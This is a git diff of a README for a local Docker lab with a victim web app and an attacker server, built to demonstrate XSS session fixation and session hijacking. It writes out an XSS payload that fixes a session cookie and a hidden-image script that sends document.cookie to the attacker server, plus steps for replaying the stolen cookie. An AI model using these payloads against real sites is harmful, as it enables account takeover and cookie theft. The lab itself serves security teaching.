@@ -1,17 +1,47 @@
-# Example
+# Quick Start
 
-Check for session fixation
+`docker-compose` up in `docker` folder
+
+## Entrypoints
+
+- Victim: `http://localhost:3000`
+- Attacker: See Docker Logs
+
+# Payloads
+
+## XSS Check
+
+Simple check to verify XSS is working:
+
+### Check for session fixation
+
 Login with: `admin` `istrator`
 
 enter
 
 `<script>document.cookie='connect.sid=12345;path=/'</script>`
 
-# Docker
+if you are logged out, XSS is possible.
 
-## Copose
+## Session Hijacking / get Cookies
 
-`docker-compose` up in `docker` folder
+### By Hidden Image
+
+```
+<script>img = document.createElement("img");img.src = "http://localhost/"+document.cookie;img.style.display = "none";x = document.getElementsByTagName("BODY")[0];x.appendChild(img);</script>
+```
+Goto other Browser:
+
+e.g. Firefox:
+
+- Web-Store
+- Cookies
+- Setup Path and value
+- Call http://localhost:3000/sessionxss/protected
+
+# Configuration in more Detail
+
+## Docker 
 
 ### Single Docker Builds
 
@@ -26,30 +56,19 @@ visit [http://localhost:3000/sessionxss/login](http://localhost:3000/sessionxss/
 
 #### Attacker Server
 
-goto `docker/attackerserver` folder
+- goto `docker/attackerserver` folder
+- run `docker build -t xss_attack_server .`
+- run `docker run --rm -ti -p 127.0.0.1:80:80 xss_attack_server .`
 
-Python + SimpleHTTPServer
+## Just Code 
 
-## Payloads
+### Attacker Server
+goto `docker/attackerserver/serverfiles`
 
-### Session Hijacking / get Cookies
-
-#### By Hidden Image
-
-```
-<script>img = document.createElement("img");img.src = "http://localhost/"+document.cookie;img.style.display = "none";x = document.getElementsByTagName("BODY")[0];x.appendChild(img);</script>
-```
-
-# Code 
-
+### Victim Server
 goto `docker/victimserver/files`
 
-## Installation
+### Execution
 
-npm install --save express@4.16.2 pug@2.0.0-rc.4 body-parser@1.18.2 multer@1.3.0 sqlite3@3.1.13 cookie-parser@1.4.3 express-session@1.15.6
-npm install nodemon
-
-## Execution
-
-run: `nodemon index.js`
-goto: http://localhost:3000/sessionxss/login
+- run: `node index.js`
+- goto: `http://localhost:3000/sessionxss/login`
